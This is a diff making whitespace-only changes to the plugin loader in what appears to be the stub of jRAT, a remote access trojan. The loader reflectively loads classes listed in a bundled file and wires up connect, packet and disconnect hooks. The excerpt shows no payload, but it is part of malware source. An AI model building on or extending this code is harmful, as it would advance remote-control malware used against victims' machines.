@@ -10,7 +10,6 @@ import java.util.List;
 import pro.jrat.common.crypto.Crypto;
 import pro.jrat.stub.utils.Utils;
 
-
 public class Plugin {
 
 	public static final List<Plugin> list = new ArrayList<Plugin>();
@@ -25,7 +24,7 @@ public class Plugin {
 		if (Main.class.getResourceAsStream("/plugins.dat") == null) {
 			return;
 		}
-		
+
 		String str = Utils.readString(Main.class.getResourceAsStream("/plugins.dat"));
 		String[] plugins = str.split(",");
 
@@ -34,25 +33,25 @@ public class Plugin {
 			Plugin p = new Plugin();
 			Class classToLoad = Class.forName(s, true, Main.class.getClassLoader());
 			p.instance = classToLoad.newInstance();
-			
-			Method onEnable = classToLoad.getMethod("onEnable", new Class[] { });
+
+			Method onEnable = classToLoad.getMethod("onEnable", new Class[] {});
 			p.methods.put("onenable", onEnable);
-			onEnable.invoke(p.instance, new Object[] { });
-			
+			onEnable.invoke(p.instance, new Object[] {});
+
 			Method onConnect = classToLoad.getMethod("onConnect", new Class[] { DataInputStream.class, DataOutputStream.class });
 			p.methods.put("onconnect", onConnect);
-			
+
 			Method onDisconnect = classToLoad.getMethod("onDisconnect", new Class[] { Exception.class });
 			p.methods.put("ondisconnect", onDisconnect);
-			
+
 			Method onPacket = classToLoad.getMethod("onPacket", new Class[] { byte.class });
 			p.methods.put("onpacket", onPacket);
-			
-			Method onStart = classToLoad.getMethod("onStart", new Class[] { });
+
+			Method onStart = classToLoad.getMethod("onStart", new Class[] {});
 			p.methods.put("onstart", onStart);
-			
-			p.name = (String) classToLoad.getMethod("getName", new Class[] { }).invoke(p.instance, new Object[] { });
-			
+
+			p.name = (String) classToLoad.getMethod("getName", new Class[] {}).invoke(p.instance, new Object[] {});
+
 			list.add(p);
 		}
 	}
